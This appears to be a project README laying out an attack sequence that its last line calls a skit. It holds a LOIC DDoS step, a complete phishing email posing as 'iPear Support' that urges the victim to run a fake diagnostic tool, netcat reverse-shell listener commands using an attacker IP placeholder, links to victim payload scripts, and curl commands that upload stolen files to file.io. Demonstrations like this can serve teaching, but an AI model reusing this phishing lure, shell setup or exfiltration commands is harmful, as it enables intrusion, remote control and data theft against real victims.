# Attack Flow

1. DDoS to a company’s computer to cause slow network traffic with LOIC

2. Send a phishing email with the ‘Network Diagnostic Tool’ to offer a solution to the slow traffics

> Subject: ACTION REQUIRED: Irregular Internet Activity Detected <br>
> Date: 19 Feb 2021 05:37:51 -0800 <br>
> From: Security Notice <it-services@support.ipear.com> <br>
>
>
> Dear Fahmi,
>
> As a precautionary measure we have restricted access to your account
> due to irregular internet activity detected.
>
> Please run the attached Internet Diagnostic Tool to resolve the issue.
>
> The Internet Diagnostic Tool is attached below.
>
> To prevent further irregular activity we will restrict access to your
> account within 72 hours if you did not run the full internet diagnostic
> test.
>
>
> To ensure your account is protected at all times, we ask you to complete the
> following steps:
>
> Check that all your computers and mobile devices used to access your account
> have an up-to-date virus scanner to detect any possible malware.
>
> Check whether any of your personal data, especially your alternative address,
> has been changed by clicking on “My Account” on your “Homepage”.
> 
> Go to your “Email settings” then click on “Filter rules” to check whether any
> forwarding rules have been created. If you created a forwarding rule
> yourself, ensure that the email address used is still valid.
>
>
> Thank you for your cooperation.
> 
>
> Sincerely, <br>
> iPear Support
>
> iPear | Support | Privacy Policy  <br>
> Copyright ©2022 Secured Service. 50 Nanyang Ave, Singapore 639798 <br>
> All rights reserved. <br>

3. Gain access to the computer and navigate through the computer’s directories
    - On attacker's computer (Linux with netcat installed), run the following
    ```bash
    sudo nc -lnvp PORT_NUMBER -s ATTACKERS_IP_ADDRESS
    ```
    - If the victim is using Windows, run the following on the attacker's computer
    ```bash
    stty raw -echo; (stty size; cat) | nc -lnvp PORT_NUMBER -s ATTACKERS_IP_ADDRESS
    ```
    - Victim runs the 'Diagnostic Tool' executable file: [Linux](../Attack/victim_linux.py) or [Windows](../Attack/victim_windows.py)
    - Boom! Access granted!

4. Upload whatever files we want to [file.io](https://file.io)
    - Run the following curl script and take note of the **KEY** it returns
    ```bash
    curl -X 'POST' \
        'https://file.io/' \
        -H 'accept: application/json' \
        -H 'Content-Type: multipart/form-data' \
        -F 'file=@FILE_NAME_GOES_HERE' \
        -F 'expires=DATETIME_IN_ISO8601_FORMAT' \
        -F 'maxDownloads=1' \
        -F 'autoDelete=true'
    ```
    - Download all the files after the attack with the following command
    ```bash
    curl -X 'GET' \
        'https://file.io/' \
        -H 'accept: */*' \
        -o 'FILE_NAME_GOES_HERE'
    ```

5. Find another company as our target to attack

6. Perform the same attack again, turns out this company has very good security in place

7. End of our skit
